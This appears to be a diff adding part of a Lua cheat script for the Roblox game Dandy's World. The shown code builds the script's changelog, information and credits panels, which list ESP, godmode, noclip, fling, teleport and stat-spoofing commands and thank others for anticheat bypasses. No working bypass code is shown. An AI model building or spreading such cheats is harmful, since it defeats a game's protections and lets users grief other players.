+- Added 1 'Main' command. (scarletdiscord)
+- Added 13 'ESPs / Visuals' commands. (enable / disable elevatoresp, enable / disable elevatortracers, enable / disable sproutstendrilesp, enable / disable sproutstendriltracers, enable / disable blotshandsesp, enable / disable blotshandstracers, faketapes [number])
+- Added 2 'Client Sided Skins' commands. (facelessshrimpo, smilingcosmo)
+- Added 11 'Map / Environment' commands. (close / open elevator, close / open trapdoors, enable / disable panicmode, enable / disable blackout, fakefloor [number], fakerequiredmachines [number], fakemachinescompleted [number])
+- Added 16 'Local Player' commands. (enable / disable autovoterandomcard, enable / disable autovotehealcard, enable / disable autovoteblindgrabcard, enable / disable autovotetapescard, enable / disable autovotefrugalcard, enable / disable autovoteelevatortimecard, enable / disable autovotemaxstaminacard, enable / disable autovotesparkplugcard, enable / disable autovoteelectriciancard, enable / disable autovotecovetouscard, enable / disable autovotetechsavvycard, enable / disable autovoteabilitycard)
+- Fixed the 'fakeblackouts', 'fakeichor', 'fakedandyitemspurchased', 'fakefloorstraveled', 'fakemachinescompleted', 'fakefurthestfloor', and 'fakeitemspickedup' commands not working at all.
+- Made it so the ESP for the research capsules tween to black for mains.
+- Fixed the 'enablenotifer' command not executing the 'enablerareitemspickedupnotifier' command. 
+- Made it so the 'enablelooprunspeed' plays your Toon's running animation when moving for Toons with new animation rigs.
+- Attempted to fix the 'enablerareitemspickedupnotifier' command not working at all after notifying once. 
+
+Other:
+- Added Vee and Twisted Vee's new animations to the Animations GUI.
+- Added Blot and Twisted Blot's animations to the Animations GUI. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.7.9 (Fully released on May 23rd 2025)", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+UI changes:
+- Attempted to fix commands and lists not fully loading.
+- Made it so executing a command in the 'Patched Commands' section will give you a warning.
+- Renamed the 'Risky Commands' command button to 'Patched Commands'.
+- Updated the 'Info' section.
+ 
+Command updates:
+- Added 1 'Scripts' command. (scarletdwscript)
+- Added 3 'Donor Commands' commands. (scriptstripperblotjumpscare, scriptpalemachinejumpscare, jobapplicationjumpscare)
+- Added 2 'Local Player' commands. (enable / disable shiftlock)
+- Added some patched commands to the 'Patched Commands' section.
+- Added Blot to the 'unlockalltoons' command.
+- Added Blot and Twisted Blot's animations to the 'animationpack' command.
+- Added Vee and Twisted Vee's new animations to the 'animationpack' command. 
+
+Other:
+- Fixed the ESP not working at all. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.7.8 (Fully released on May 23rd 2025)", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+UI changes:
+- Attempted to fix commands and lists not fully loading.
+- Renamed the 'Risky Commands' command button to 'Patched Commands'.
+ 
+Command updates:
+- Updated the 'enablegodmode3' command and made it more reliable.
+- Renamed the 'enable / disable allvisualizers' commands to 'show / hide allvisualizers'.
+- Fixed the 'smallserverhop' command always not being able to find a small server.
+- Fixed the 'enablewalkfling' command glitching your character.
+- Attempted to fix commands regarding teleportation always disabling noclip upon execution.
+	 
+Other:
+- Added Blot and Twisted Blot's animations to the Animations GUI.
+- Attempted to optimize the script. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.7.7 (Fully released on May 20th 2025)", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+UI changes:
+- Fixed configurations and settings tab requiring two inputs in order to edit a setting for mobile.
+- Removed the Settings and Configurations tab and added a 'Settings' button in the 'Credits' section.
+- Attempted to fix commands and lists not fully loading.
+- Updated the interface design.
+- Added a minimize interface button.
+- Brung back the 'Client Sided Skins' command list button.
+- Updated the intro sequence.
+
+Command updates:
+- Added 1 'Map / Environment' commands. (spawnplushies)
+- Added 2 'Main' commands. (serverhop, smallserverhop)
+- Added 4 'Animations / Emotes' commands. (spasm, unspasm, glitch, unglitch)
+- Added 1 'Donor Commands' command. (scriptforceruncommand [command])
+- Added 2 'Risky Commands' commands. (enable / disable spameggsonabilityaudio)
+- Added Twisted Toon animations for the animpack command.
+- Renamed the 'enable / disable rareitempickedupchatguider' commands to 'enable / disable rareitempickedupnotifier.'
+- Renamed 'bbang' to 'peg'.
+- Removed the 'usesemiblatantloadout' command and replaced it with the 'usenonblatantloadout' command.
+- Made it so the 'enablelooprunspeed' command gets adjusted and multiplied by the walkspeed modifier.
+- Fixed the 'enablesprouthealnearby' and 'enablecosmohealnearby' commands not working at all.
+
+Other:
+- Attempted to fix the donor gamepass check.
+- Fixed ESP configurations not working at all.
+- Updated item name aliases.
+- Attempted to fix random lagspikes occurring when reaching floor 5-7.
+- Made it so extraction speed candies count as an extraction item.
+- Adjusted some command descriptions.
+- Renamed 'Premium' to 'Donor'.
+- Attempted to optimize the script. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Version 7.7.6 (Fully released on May 14th 2025)", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+UI changes:
+- Attempted to fix commands and lists not fully loading.
+- Updated the Intro animations.
+- Removed the settings and main button.
+- Added 2 new tabs. (Configs, Settings)
+- Renamed Changelogs tab to 'Changes'.
+ 
+Command updates:
+- Added 6 'Local Player' commands. (enable / disable dekaautofarm, enable / disable sprouthealnearby, enable / disable cosmohealnearby)
+- Attempted to fix the 'enableitempickupchatguider' command spamming messages.
+- Attempted to fix the 'deleteinvisibleborders' command not working at all.
+- Fixed Vee's Remote causing issues for the 'gtechatguider' command.
+	 
+Other:
+- Fixed command descriptions. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["information"] = {
+	{type = "line", text = "┌  Script information", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+Noxious Hub: Dandy's World (Version ]] .. noxious["version"] .. [[)
+A script used to enhance your experience when playing Dandy's World.
+Total commands: ]] .. noxious["total commands"] .. [[
+
+
+Thank you all for ]] .. noxious["uses"] .. [[ uses!
+If you enjoy the script, please consider donating for donor perks! (getdonorperks) ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Command information", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+Command bar prefix: . ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Keybinds", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+Press Q or the icon to skip the loading sequence after running the script.
+
+Press the toggle button to toggle the visibility of the interface.
+
+Press X on your keyboard to close all notifications. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Toon names", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+'Astro' = Astro
+'Bassie' = Bassie
+'Boxten' = Boxten
+'Bobette' = Bobette
+'Blot' = Blot
+'Brightney' = Brightney
+'Coal' = Coal
+'Cocoa' = Cocoa
+'Connie' = Connie
+'Cosmo' = Cosmo
+'Dandy' = Dandy
+'Eggson' = Eggson
+'Finn' = Finn
+'Flutter' = Flutter
+'Flyte' = Flyte
+'Gigi' = Gigi
+'Ginger' = Ginger
+'Glisten' = Glisten
+'Goob' = Goob
+'Looey' = Looey
+'Pebble', 'Pebbles' = Pebble
+'Poppy' = Poppy
+'RazzleAndDazzle', 'RazzleDazzle', 'RND' = Razzle & Dazzle
+'Rodger' = Rodger
+'Rudie' = Rudie
+'Scraps' = Scraps
+'Shelly' = Shelly
+'Shrimpo' = Shrimpo
+'Srpout' = Sprout
+'Teagan' = Teagan
+'Tisha' = Tisha
+'Toodles' = Toodles
+'Vee' = Vee
+'Yatta' = Yatta ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Command arguments", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+[target] = Sets the target(s) for the command.
+[target 1] [target 2] = Sets target 2 to be affected by target 1.
+[command] = Sets the command used for the command.
+[(asset) id] = Sets the target asset ID used for the command.
+[color] = Sets the color used for the command.
+[number] = Sets the number input for the command.
+[speed] = Sets the speed for the command.
+[range] = Sets the range for the command.
+[delay] = Sets the delay for a loop command.
+[text] = Sets the text used for the command.
+[toon name] = Sets the Toon used for the command.
+[x, y, z] = Sets the X, Y, and Z values for the command. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Player arguments", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+'Me' = Targets you
+'Others' = Targets everyone but you
+'All' = Targets everyone in the server
+'Random' = Targets a random player in the server.
+'(Username)' = Targets the specified username. ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Color arguments", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+'Red', 'R' = Red color
+'Orange', 'O' = Orange color
+'Yellow', 'Y' = Yellow color
+'Green', 'GN' = Green color
+'Cyan', 'C' = Cyan color
+'Blue', 'BE' = Blue color
+'Purple', 'PE' = Purple color
+'Pink', 'PK' = Pink color
+'Brown', 'BN' = Brown color
+'White', 'W' = White color
+'Gray', 'GY' = Gray color
+'Black', 'BK' = Black color
+'Rainbow', 'RB' = Dynamic rainbow ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["credits"] = {
+	{type = "line", text = "┌  Team Noxious, Team Occulence & Others", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+unable & Plethora - Scripting, UI designing
+dextrocities, pronouncer & mnqn - Scripting, Bug fixing
+hypnic, incognito, & qapacity - Scripting
+OpenAI & nomin8 - Bug fixing
+scope & timeisticking - UI designing
+Able, craadle & Our Testers - Testing ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Additional thanks / Credits", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+Scarlet & olivia - For their 'Riddance Hub' script and anticheat bypasses
+Deka (Omen) - For their godmodes, anticheat bypasses and autofarm script
+Crossattic - For their teleport bypass
+Rode Striker - For their 'The Dandy Helper' script
+FFJ - For their 'Dandys | FFJ Hub' script
+jaonoobao - For their 'Poltergeist Hub' script
+ApparentlySpooks & Mox - For their 'MoxHub' and 'Spooks Hub' scripts
+Otvajni - For their 'Fly REBORN' and 'EgasHub' scripts
+bob junior - For their 'B0bbyhub' script
+Bac0nH1ckOff - For their 'OP SCRIPT | REUPLOAD' script
+@gigi_hilton on Discord - For his Twisted Poppy skin script
+@omg0960 on Discord - For their 'Yiw Hub' script
+G0bbyD0llan57 - For their 'G0bbyD0llan DW' script
+Hex233222 - For their 'Hex's Hub' script
+RED_BLOXZ - For their 'Mobile Keyboard' script
+Edge & Others - For their 'FE Infinite Yield' script
+Moon & Others - For their 'Dark Dex' script
+ScriptBlox Comments - Reporting bugs and making suggestions ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+
+	{type = "line", text = "┌  Developer note", paddingRight = 12},
+
+	{
+		type = "paragraph",
+		text = [[
+nebulabrasque by cherryteam finna be a fire ass level icl ]],
+		width = UDim2.new(0, 565, 0, 0),
+		paddingLeft = 1,
+		paddingRight = 10,
+		textPaddingLeft = 8,
+		textPaddingTop = 6
+	},
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["changelogs holder"] = Instance.new("ScrollingFrame")
+noxious["changelogs holder"].Visible = false
+noxious["changelogs holder"].Size = UDim2.new(1, 0, 0, 204)
+noxious["changelogs holder"].Position = UDim2.new(0, 0, 0, 50)
+noxious["changelogs holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
+noxious["changelogs holder"].ScrollBarThickness = 10
+noxious["changelogs holder"].ScrollBarImageColor3 = noxious["default white color"]
+noxious["changelogs holder"].BackgroundTransparency = 1
+noxious["changelogs holder"].BorderSizePixel = 0
+noxious["changelogs holder"].BorderColor3 = noxious["default white color"]
+noxious["changelogs holder"].ScrollingDirection = Enum.ScrollingDirection.Y
+noxious["changelogs holder"].Parent = mainframe
+
+noxious["changelogs text padding"] = Instance.new("UIPadding")
+noxious["changelogs text padding"].PaddingLeft = UDim.new(0, 8)
+noxious["changelogs text padding"].PaddingTop = UDim.new(0, 4)
+noxious["changelogs text padding"].Parent = noxious["changelogs holder"]
+
+function populateChangelogs(entries)
+	local offsetY = 0
+	for _, entry in ipairs(entries) do
+		local element = Instance.new("TextLabel")
+
+		local leftPad = entry.paddingLeft or 5
+		local rightPad = entry.paddingRight or 5
+		local topPad = entry.paddingTop or 5
+		local bottomPad = entry.paddingBottom or 5
+
+		element.Position = UDim2.new(0, leftPad, 0, offsetY)
+		element.BackgroundTransparency = (entry.type == "line") and 1 or 0
+		element.BackgroundColor3 = (entry.type == "paragraph") and Color3.fromRGB(0, 0, 0) or Color3.new(0, 0, 0)
+		element.BorderSizePixel = 1
+		element.BorderColor3 = noxious["default white color"]
+		element.TextColor3 = noxious["default white color"]
+		element.Font = Enum.Font.Nunito
+		element.TextSize = 19
+		element.TextWrapped = true
+		element.TextScaled = false
+		element.TextXAlignment = Enum.TextXAlignment.Left
+		element.TextYAlignment = Enum.TextYAlignment.Top
+		element.Text = entry.text
+		element.Parent = noxious["changelogs holder"]
+		element.ZIndex = 3
+
+		if entry.type == "paragraph" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, entry.textPaddingLeft or 6)
+			padding.PaddingTop = UDim.new(0, entry.textPaddingTop or 4)
+			padding.PaddingRight = UDim.new(0, entry.textPaddingRight or 6)
+			padding.PaddingBottom = UDim.new(0, entry.textPaddingBottom or 4)
+			padding.Parent = element
+			element.TextSize = 17
+		end
+
+		if entry.type == "line" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, -2)
+			padding.PaddingTop = UDim.new(0, 6)
+			padding.Parent = element
+		end
+
+		local widthOffset = (leftPad + rightPad)
+		local widthUDim = entry.width or UDim2.new(1, -widthOffset, 0, 10)
+		element.Size = widthUDim
+
+		local height
+		if entry.height then
+			height = entry.height
+		else
+			local textService = game:GetService("TextService")
+			local contentWidth = noxious["changelogs holder"].AbsoluteSize.X - (widthOffset + 10)
+			local textSize = textService:GetTextSize(entry.text, 19, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			if entry.type == "paragraph" then
+				textSize = textService:GetTextSize(entry.text, 17, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			end
+			height = math.max(30, textSize.Y + topPad + bottomPad + 3)
+		end
+
+		element.Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset, 0, height)
+
+		offsetY += height + 4
+	end
+
+	noxious["changelogs holder"].CanvasSize = UDim2.new(0, 0, 0, offsetY + 9)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["information holder"] = Instance.new("ScrollingFrame")
+noxious["information holder"].Visible = false
+noxious["information holder"].Size = UDim2.new(1, 0, 0, 204)
+noxious["information holder"].Position = UDim2.new(0, 0, 0, 50)
+noxious["information holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
+noxious["information holder"].ScrollBarThickness = 10
+noxious["information holder"].ScrollBarImageColor3 = noxious["default white color"]
+noxious["information holder"].BackgroundTransparency = 1
+noxious["information holder"].BorderSizePixel = 0
+noxious["information holder"].BorderColor3 = noxious["default white color"]
+noxious["information holder"].ScrollingDirection = Enum.ScrollingDirection.Y
+noxious["information holder"].Parent = mainframe
+
+noxious["information text padding"] = Instance.new("UIPadding")
+noxious["information text padding"].PaddingLeft = UDim.new(0, 8)
+noxious["information text padding"].PaddingTop = UDim.new(0, 4)
+noxious["information text padding"].Parent = noxious["information holder"]
+
+function populateInformation(entries)
+	local offsetY = 0
+	for _, entry in ipairs(entries) do
+		local element = Instance.new("TextLabel")
+
+		local leftPad = entry.paddingLeft or 5
+		local rightPad = entry.paddingRight or 5
+		local topPad = entry.paddingTop or 5
+		local bottomPad = entry.paddingBottom or 5
+
+		element.Position = UDim2.new(0, leftPad, 0, offsetY)
+		element.BackgroundTransparency = (entry.type == "line") and 1 or 0
+		element.BackgroundColor3 = (entry.type == "paragraph") and Color3.fromRGB(0, 0, 0) or Color3.new(0, 0, 0)
+		element.BorderSizePixel = 1
+		element.BorderColor3 = noxious["default white color"]
+		element.TextColor3 = noxious["default white color"]
+		element.Font = Enum.Font.Nunito
+		element.TextSize = 19
+		element.TextWrapped = true
+		element.TextScaled = false
+		element.TextXAlignment = Enum.TextXAlignment.Left
+		element.TextYAlignment = Enum.TextYAlignment.Top
+		element.Text = entry.text
+		element.Parent = noxious["information holder"]
+		element.ZIndex = 3
+
+		if entry.type == "paragraph" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, entry.textPaddingLeft or 6)
+			padding.PaddingTop = UDim.new(0, entry.textPaddingTop or 4)
+			padding.PaddingRight = UDim.new(0, entry.textPaddingRight or 6)
+			padding.PaddingBottom = UDim.new(0, entry.textPaddingBottom or 4)
+			padding.Parent = element
+			element.TextSize = 17
+		end
+
+		if entry.type == "line" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, -2)
+			padding.PaddingTop = UDim.new(0, 6)
+			padding.Parent = element
+		end
+
+		local widthOffset = (leftPad + rightPad)
+		local widthUDim = entry.width or UDim2.new(1, -widthOffset, 0, 10)
+		element.Size = widthUDim
+
+		local height
+		if entry.height then
+			height = entry.height
+		else
+			local textService = game:GetService("TextService")
+			local contentWidth = noxious["information holder"].AbsoluteSize.X - (widthOffset + 10)
+			local textSize = textService:GetTextSize(entry.text, 19, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			if entry.type == "paragraph" then
+				textSize = textService:GetTextSize(entry.text, 17, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			end
+			height = math.max(30, textSize.Y + topPad + bottomPad + 3)
+		end
+
+		element.Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset, 0, height)
+
+		offsetY += height + 4
+	end
+
+	noxious["information holder"].CanvasSize = UDim2.new(0, 0, 0, offsetY + 9)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function populateinfo()
+	local infoFolder = workspace:FindFirstChild("Info")
+
+	local excludedNames = {
+		["Message"] = true,
+		["PickedCharacters"] = true,
+		["PlayerStats"] = true,
+		["CardVote"] = true,
+		["DandyTracker"] = true,
+		["CardModifiers"] = true,
+		["ForceSpawnFloor"] = true,
+		["GameStats"] = true,
+		["ElevatorPrompt"] = true,
+	}
+
+	local function populateInformation(entries)
+		local offsetY = 0
+		local holder = noxious["dandy's world workspace.info holder"]
+
+		for _, child in ipairs(holder:GetChildren()) do
+			if child:IsA("TextLabel") then
+				child:Destroy()
+			end
+		end
+
+		for _, entry in ipairs(entries) do
+			local element = Instance.new("TextLabel")
+
+			local leftPad = entry.paddingLeft or 5
+			local rightPad = entry.paddingRight or 5
+			local topPad = entry.paddingTop or 5
+			local bottomPad = entry.paddingBottom or 5
+
+			element.Position = UDim2.new(0, leftPad, 0, offsetY)
+			element.BackgroundTransparency = (entry.type == "line") and 1 or 0
+			element.BackgroundColor3 = (entry.type == "paragraph") and Color3.fromRGB(0, 0, 0) or Color3.new(0, 0, 0)
+			element.BorderSizePixel = 1
+			element.BorderColor3 = noxious["default white color"]
+			element.TextColor3 = noxious["default white color"]
+			element.Font = Enum.Font.Nunito
+			element.TextSize = 19
+			element.TextWrapped = true
+			element.TextScaled = false
+			element.TextXAlignment = Enum.TextXAlignment.Left
+			element.TextYAlignment = Enum.TextYAlignment.Top
+			element.Text = entry.text
+			element.Parent = holder
+			element.ZIndex = 3
+
+			if entry.type == "paragraph" or entry.type == "title" then
+				local padding = Instance.new("UIPadding")
+				padding.PaddingLeft = UDim.new(0, entry.textPaddingLeft or 6)
+				padding.PaddingTop = UDim.new(0, entry.textPaddingTop or 4)
+				padding.PaddingRight = UDim.new(0, entry.textPaddingRight or 6)
+				padding.PaddingBottom = UDim.new(0, entry.textPaddingBottom or 4)
+				padding.Parent = element
+
+				if entry.type == "paragraph" then
+					element.TextSize = 17
+					element.Size = UDim2.new(0, 2, 0, 0)
+				end
+
+				if entry.type == "title" then
+					element.BackgroundTransparency = 1
+				end
+			end
+
+			local widthOffset = (leftPad + rightPad)
+			local widthUDim = entry.width or UDim2.new(1, -widthOffset, 0, 10)
+			element.Size = widthUDim
+
+			local height
+			if entry.height then
+				height = entry.height
+			else
+				local textService = game:GetService("TextService")
+				local contentWidth = holder.AbsoluteSize.X - (widthOffset + 10)
+				local fontSize = (entry.type == "paragraph") and 17 or 19
+				local textSize = textService:GetTextSize(entry.text, fontSize, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+				height = math.max(30, textSize.Y + topPad + bottomPad)
+			end
+
+			element.Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset, 0, height)
+			offsetY += height + 6
+		end
+
+		holder.CanvasSize = UDim2.new(0, 0, 0, offsetY + 7)
+	end
+
+	if typeof(infoFolder) ~= "Instance" or not infoFolder:IsA("Folder") then
+		populateInformation({
+			{type = "title", 
+				text = "┌  Information (Workspace.Info)", 			
+				paddingLeft = -3,
+				paddingRight = 5,
+				paddingTop = 5,
+				paddingBottom = 5,
+				textPaddingLeft = 6,
+				textPaddingTop = 6,
+				textPaddingRight = 6,
+				textPaddingBottom = 4,},
+			{type = "paragraph", 
+				text = "No information available.",
+				width = UDim2.new(0, 565, 0, 10),
+				paddingLeft = 1,
+				paddingRight = 5,
+				paddingTop = 5,
+				paddingBottom = 5,
+				textPaddingLeft = 8,
+				textPaddingTop = 6,
+				textPaddingRight = 6,
+				textPaddingBottom = 4,
+			}
+		})
+		return
+	end
+
+	local function getValue(instance)
+		if instance:IsA("StringValue") then
+			return instance.Value
+		elseif instance:IsA("IntValue") or instance:IsA("NumberValue") or instance:IsA("BoolValue") then
+			return tostring(instance.Value)
+		else
+			return "N/A"
+		end
+	end
+
+	local function refresh()
+		local entries = {}
+
+		table.insert(entries, {
+			type = "title",
+			text = "┌  Information (Workspace.Info)",
+			paddingLeft = -3,
+			paddingRight = 5,
+			paddingTop = 5,
+			paddingBottom = 5,
+			textPaddingLeft = 6,
+			textPaddingTop = 6,
+			textPaddingRight = 6,
+			textPaddingBottom = 4,
+		})
+
+		local infoEntries = infoFolder and infoFolder:GetChildren() or noxious["dandy's world workspace.info"]
+		local paragraphText = ""
+
+		local lines = {}
+		for _, child in ipairs(infoEntries) do
+			if not excludedNames[child.Name] then
+				table.insert(lines, "[" .. child.Name .. "]: " .. getValue(child))
+			end
+		end
+
+		paragraphText = table.concat(lines, "\n")
+
+		if paragraphText == "" then
+			paragraphText = "No information available."
+		end
+
+		table.insert(entries, {
+			type = "paragraph",
+			text = paragraphText,
+			width = UDim2.new(0, 565, 0, 8),
+			paddingLeft = 1,
+			paddingRight = 5,
+			paddingTop = 5,
+			paddingBottom = 5,
+			textPaddingLeft = 6,
+			textPaddingTop = 4,
+			textPaddingRight = 6,
+			textPaddingBottom = 4,
+		})
+
+		populateInformation(entries)
+	end
+
+	refresh()
+
+	if infoFolder then
+		infoFolder.ChildAdded:Connect(function()
+			task.wait(0.1)
+			refresh()
+		end)
+		infoFolder.ChildRemoved:Connect(refresh)
+
+		for _, child in ipairs(infoFolder:GetChildren()) do
+			if child:IsA("ValueBase") then
+				child:GetPropertyChangedSignal("Value"):Connect(refresh)
+			end
+		end
+
+		infoFolder.ChildAdded:Connect(function(child)
+			if child:IsA("ValueBase") then
+				child:GetPropertyChangedSignal("Value"):Connect(refresh)
+			end
+		end)
+	end
+end
+
+noxious["dandy's world workspace.info holder"] = Instance.new("ScrollingFrame")
+noxious["dandy's world workspace.info holder"].Visible = false
+noxious["dandy's world workspace.info holder"].Size = UDim2.new(1, 0, 0, 204)
+noxious["dandy's world workspace.info holder"].Position = UDim2.new(0, 0, 0, 50)
+noxious["dandy's world workspace.info holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
+noxious["dandy's world workspace.info holder"].ScrollBarThickness = 10
+noxious["dandy's world workspace.info holder"].ScrollBarImageColor3 = noxious["default white color"]
+noxious["dandy's world workspace.info holder"].BackgroundTransparency = 1
+noxious["dandy's world workspace.info holder"].BorderSizePixel = 0
+noxious["dandy's world workspace.info holder"].BorderColor3 = noxious["default white color"]
+noxious["dandy's world workspace.info holder"].ScrollingDirection = Enum.ScrollingDirection.Y
+noxious["dandy's world workspace.info holder"].Parent = mainframe
+
+noxious["dandy's world workspace.info text padding"] = Instance.new("UIPadding")
+noxious["dandy's world workspace.info text padding"].PaddingLeft = UDim.new(0, 8)
+noxious["dandy's world workspace.info text padding"].PaddingTop = UDim.new(0, 4)
+noxious["dandy's world workspace.info text padding"].Parent = noxious["dandy's world workspace.info holder"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["credits holder"] = Instance.new("ScrollingFrame")
+noxious["credits holder"].Visible = false
+noxious["credits holder"].Size = UDim2.new(1, 0, 0, 204)
+noxious["credits holder"].Position = UDim2.new(0, 0, 0, 50)
+noxious["credits holder"].CanvasSize = UDim2.new(0, 0, 0, 0)
+noxious["credits holder"].ScrollBarThickness = 10
+noxious["credits holder"].ScrollBarImageColor3 = noxious["default white color"]
+noxious["credits holder"].BackgroundTransparency = 1
+noxious["credits holder"].BorderSizePixel = 0
+noxious["credits holder"].BorderColor3 = noxious["default white color"]
+noxious["credits holder"].ScrollingDirection = Enum.ScrollingDirection.Y
+noxious["credits holder"].Parent = mainframe
+
+noxious["credits text padding"] = Instance.new("UIPadding")
+noxious["credits text padding"].PaddingLeft = UDim.new(0, 8)
+noxious["credits text padding"].PaddingTop = UDim.new(0, 4)
+noxious["credits text padding"].Parent = noxious["credits holder"]
+
+function populatecredits(entries)
+	local offsetY = 0
+	for _, entry in ipairs(entries) do
+		local element = Instance.new("TextLabel")
+
+		local leftPad = entry.paddingLeft or 5
+		local rightPad = entry.paddingRight or 5
+		local topPad = entry.paddingTop or 5
+		local bottomPad = entry.paddingBottom or 5
+
+		element.Position = UDim2.new(0, leftPad, 0, offsetY)
+		element.BackgroundTransparency = (entry.type == "line") and 1 or 0
+		element.BackgroundColor3 = (entry.type == "paragraph") and Color3.fromRGB(0, 0, 0) or Color3.new(0, 0, 0)
+		element.BorderSizePixel = 1
+		element.BorderColor3 = noxious["default white color"]
+		element.TextColor3 = noxious["default white color"]
+		element.Font = Enum.Font.Nunito
+		element.TextSize = 19
+		element.TextWrapped = true
+		element.TextScaled = false
+		element.TextXAlignment = Enum.TextXAlignment.Left
+		element.TextYAlignment = Enum.TextYAlignment.Top
+		element.Text = entry.text
+		element.Parent = noxious["credits holder"]
+		element.ZIndex = 3
+
+		if entry.type == "paragraph" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, entry.textPaddingLeft or 6)
+			padding.PaddingTop = UDim.new(0, entry.textPaddingTop or 4)
+			padding.PaddingRight = UDim.new(0, entry.textPaddingRight or 6)
+			padding.PaddingBottom = UDim.new(0, entry.textPaddingBottom or 4)
+			padding.Parent = element
+			element.TextSize = 17
+		end
+
+		if entry.type == "line" then
+			local padding = Instance.new("UIPadding")
+			padding.PaddingLeft = UDim.new(0, -2)
+			padding.PaddingTop = UDim.new(0, 6)
+			padding.Parent = element
+		end
+
+		local widthOffset = (leftPad + rightPad)
+		local widthUDim = entry.width or UDim2.new(1, -widthOffset, 0, 10)
+		element.Size = widthUDim
+
+		local height
+		if entry.height then
+			height = entry.height
+		else
+			local textService = game:GetService("TextService")
+			local contentWidth = noxious["credits holder"].AbsoluteSize.X - (widthOffset + 10)
+			local textSize = textService:GetTextSize(entry.text, 19, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			if entry.type == "paragraph" then
+				textSize = textService:GetTextSize(entry.text, 17, Enum.Font.Nunito, Vector2.new(contentWidth, math.huge))
+			end
+			height = math.max(30, textSize.Y + topPad + bottomPad + 3)
+		end
+
+		element.Size = UDim2.new(element.Size.X.Scale, element.Size.X.Offset, 0, height)
+
+		offsetY += height + 4
+	end
+
+	noxious["credits holder"].CanvasSize = UDim2.new(0, 0, 0, offsetY + 9)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
